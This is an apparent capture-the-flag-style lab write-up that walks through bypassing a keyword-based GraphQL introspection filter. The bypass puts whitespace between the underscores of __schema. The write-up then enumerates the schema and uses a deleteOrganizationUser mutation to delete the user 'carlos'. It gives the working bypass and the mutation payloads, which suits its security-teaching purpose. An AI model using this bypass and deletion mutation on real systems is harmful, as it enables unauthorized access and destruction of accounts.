# GraphQL API Vulnerabilities - Bypassing GraphQL Introspection Defenses

## Lab Description

This lab contains a GraphQL endpoint where introspection appears to be disabled. However, the protection only blocks queries containing the keywords `__schema` and `__type`.

Your goal is to bypass this restriction, discover the schema, find Carlos' user ID, and delete his account.

**Objective:** Delete the user `carlos`.

---

## Skills Practiced

- Discovering GraphQL endpoints
- Testing GraphQL introspection
- Understanding GraphQL validation
- Bypassing weak introspection filters
- Enumerating GraphQL schema
- Executing GraphQL mutations

---

# Step 1 - Discover the GraphQL Endpoint

Sending a request to `/api` without any query returns:

```
GET /api HTTP/2
```

Response:

```json
"Query not present"
```

This confirms that `/api` is a GraphQL endpoint.

---

## Screenshot

![Finding GraphQL Endpoint](finding-graphql-endpoint-throgh-error-message.png)

---

# Step 2 - Verify GraphQL

Send the universal GraphQL query:

```
GET /api?query=query{__typename}
```

Response:

```json
{
  "data": {
    "__typename": "query"
  }
}
```

The endpoint accepts GraphQL queries.

---

## Screenshot

![Universal Query](sending-request-containing-universal-query.png)

---

# Step 3 - Attempt GraphQL Introspection

A standard introspection query returns:

```json
{
    "errors":[
        {
            "message":"GraphQL introspection is not allowed, but the query contained __schema or __type"
        }
    ]
}
```

The server blocks introspection by searching for the strings:

- `__schema`
- `__type`

rather than disabling introspection properly.

---

## Screenshot

![Blocked Introspection](graphql-introspection-is-disallowed.png)

---

# Step 4 - Bypass the Protection

The GraphQL parser ignores insignificant whitespace.

Insert a newline between the underscores:

```
__schema
```

becomes

```
_
_schema
```

(or insert another whitespace/newline between the underscores)

The server-side filter no longer matches the blocked keyword, while GraphQL still interprets it correctly.

After modifying the introspection query, the full schema is returned successfully.

From the schema we discover:

### Query

```
getUser(id: Int!)
```

### Mutation

```
deleteOrganizationUser(input: DeleteOrganizationUserInput)
```

Input object:

```
DeleteOrganizationUserInput
```

contains

```
id: Int!
```

---

## Screenshot

![Bypassed Introspection](bypassing-the-safety-measures-to-access-introspection.png)

---

# Step 5 - Test getUser

Construct the query:

```graphql
query($id: Int!) {
    getUser(id: $id) {
        id
        username
    }
}
```

Variables

```json
{
    "id": 3
}
```

Response:

```json
{
    "data": {
        "getUser": {
            "id": 3,
            "username": "carlos"
        }
    }
}
```

Carlos' user ID is **3**.

---

## Screenshot

![Finding Carlos ID](getting-carlos's-id-through-trial-and-error.png)

---

# Step 6 - Delete Carlos

Use the discovered mutation:

```graphql
mutation($input: DeleteOrganizationUserInput) {
    deleteOrganizationUser(input: $input) {
        user {
            id
            username
        }
    }
}
```

Variables

```json
{
    "input": {
        "id": 3
    }
}
```

Response:

```json
{
    "data": {
        "deleteOrganizationUser": {
            "user": {
                "id": 3,
                "username": "carlos"
            }
        }
    }
}
```

Carlos is successfully deleted, solving the lab.

---

## Screenshot

![Delete Carlos](providing-deleteUser-with-carlos's-id.png)

---

# Key Takeaways

- GraphQL endpoints often expose `/api`.
- `query { __typename }` is a quick way to verify GraphQL.
- Blocking only `__schema` or `__type` with string matching is ineffective.
- GraphQL ignores insignificant whitespace, allowing filter bypasses.
- Introspection reveals:
  - Queries
  - Mutations
  - Input types
  - Arguments
  - Object fields
- Once the schema is known, sensitive mutations become easy to identify and exploit.

---

# Vulnerability

**Improper GraphQL Introspection Protection**

The application attempted to prevent schema discovery by filtering requests containing the strings `__schema` and `__type`. Because the filter relied on simple string matching instead of disabling introspection at the GraphQL engine, inserting whitespace bypassed the restriction and exposed the complete schema. The disclosed schema enabled enumeration of available queries and mutations, ultimately allowing the attacker to identify Carlos' user ID and invoke the `deleteOrganizationUser` mutation.

---
